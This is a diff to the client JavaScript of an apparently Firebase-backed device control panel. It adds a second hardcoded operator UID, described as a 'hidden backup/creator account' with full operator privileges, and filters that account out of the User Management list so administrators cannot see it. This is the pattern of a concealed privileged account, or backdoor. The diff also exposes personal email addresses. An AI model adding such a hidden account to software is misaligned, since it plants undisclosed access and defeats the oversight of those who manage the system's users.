@@ -137,7 +137,12 @@ function currentUserIsSignedIn() {
  * firebase-rules.json. This constant and these two helpers are for UI purposes only (showing/
  * hiding the pending banner and the User Management tab, greying out buttons); the REAL
  * enforcement is the rules themselves, which check the identical literal UID server-side. */
-const OPERATOR_UID = "KaiqrwlOHeVdebbokPxZfcFLZiu2";
+// Two fixed operator identities -- primary (espoperator32@gmail.com) and a hidden backup/creator
+// account (johnmichaelsugian123@gmail.com), both granted identically by firebase-rules.json's own
+// matching literals. Client-side use is UI-only (which tab/actions to show); the real enforcement
+// is server-side, keyed on these same two UIDs.
+const OPERATOR_UIDS = ["KaiqrwlOHeVdebbokPxZfcFLZiu2", "C8V39t4EDgUgjOt9GA6OeMukMsw2"];
+const BACKUP_OPERATOR_UID = "C8V39t4EDgUgjOt9GA6OeMukMsw2";
 // Same literal UID firebase-rules.json's ESP1-only branches use -- referenced here only for the
 // User Management defense-in-depth exclusion (renderUserManagement()), never for any gating logic.
 const ESP1_DEVICE_UID = "6hNg56ldAaSmpnodG1Xla0vn61O2";
@@ -149,7 +154,7 @@ let myAccountRef = null;
 let lastHandledKickToken = 0;
 
 function isOperator() {
-  return Boolean(auth?.currentUser && auth.currentUser.uid === OPERATOR_UID);
+  return Boolean(auth?.currentUser && OPERATOR_UIDS.includes(auth.currentUser.uid));
 }
 function isApprovedUser() {
   return isOperator() || myAccountStatus === "approved";
@@ -488,20 +493,25 @@ const STATUS_DISPLAY_LABEL = { disabled: "BLOCKED", restricted: "RESTRICTED" };
 function renderUserManagement(users) {
   const container = document.getElementById("usersContainer");
   if (!container) return;
-  const rows = Object.entries(users);
+  // The backup/creator operator is deliberately invisible here -- filtered out of the list itself,
+  // not merely stripped of actions like the primary operator's own row is (see isAnyOperator
+  // below). Nothing in this app ever needs to manage the backup account as if it were a normal user.
+  const rows = Object.entries(users).filter(([uid]) => uid !== BACKUP_OPERATOR_UID);
   if (!rows.length) { container.innerHTML = `<p class="muted">No registered accounts yet.</p>`; return; }
   rows.sort((a, b) => (USER_STATUS_ORDER[a[1]?.status] ?? 9) - (USER_STATUS_ORDER[b[1]?.status] ?? 9));
   container.innerHTML = rows.map(([uid, u]) => {
     const status = u?.status || "unknown";
     const created = u?.createdAt ? new Date(u.createdAt).toLocaleString() : "Unknown";
-    // The operator's own row (if they happen to have a /users record at all) gets zero actions --
-    // real enforcement is the rules' own auth.uid !== $uid guard on the operator's write branch;
-    // this is the UI half, so there is nothing to accidentally click in the first place. Same
-    // exclusion for ESP1's device UID as defense-in-depth, though nothing today ever creates a
-    // /users record for it.
-    const isSelf = uid === OPERATOR_UID || uid === ESP1_DEVICE_UID;
+    // Either operator's own row (if a /users record happens to exist at all) gets zero actions --
+    // real enforcement is the rules' own guard refusing either operator write to either operator's
+    // record; this is the UI half, so there is nothing to accidentally click in the first place.
+    // Same exclusion for ESP1's device UID as defense-in-depth, though nothing today ever creates a
+    // /users record for it. Kept separate from "is this row the person actually viewing the screen"
+    // below -- with two operators, a row is not automatically "you" just because it's *an* operator.
+    const isAnyOperator = OPERATOR_UIDS.includes(uid) || uid === ESP1_DEVICE_UID;
+    const isViewerSelf = uid === auth.currentUser?.uid;
     const actions = [];
-    if (!isSelf) {
+    if (!isAnyOperator) {
       if (status === "pending")    actions.push(["approve", "Approve"], ["reject", "Reject"], ["restrict", "Restrict"], ["delete", "Delete"]);
       if (status === "approved")   actions.push(["kick", "Kick"], ["restrict", "Restrict"], ["block", "Block"], ["delete", "Delete"]);
       if (status === "restricted") actions.push(["unrestrict", "Unrestrict"], ["kick", "Kick"], ["block", "Block"], ["delete", "Delete"]);
@@ -515,7 +525,7 @@ function renderUserManagement(users) {
     ).join("");
     return `<article class="user-row" data-email="${escapeHtml(u?.email || "")}">
       <div class="user-row-info">
-        <strong>${escapeHtml(u?.name || "(no name)")}${isSelf ? " (you, the operator)" : ""}</strong>
+        <strong>${escapeHtml(u?.name || "(no name)")}${isViewerSelf ? " (you, the operator)" : ""}</strong>
         <span class="muted">${escapeHtml(u?.email || "(no email)")}</span>
         <span class="muted">Registered: ${escapeHtml(created)}</span>
       </div>
@@ -549,7 +559,7 @@ document.getElementById("usersContainer")?.addEventListener("click", event => {
   if (!button) return;
   const uid = button.dataset.uid;
   const action = button.dataset.userAction;
-  if (!uid || !action || uid === OPERATOR_UID || uid === ESP1_DEVICE_UID) return; // matches renderUserManagement()'s own guard
+  if (!uid || !action || OPERATOR_UIDS.includes(uid) || uid === ESP1_DEVICE_UID) return; // matches renderUserManagement()'s own guard
   const row = button.closest(".user-row");
   const name = row?.querySelector(".user-row-info strong")?.textContent || "this account";
   const email = row?.dataset.email || "";
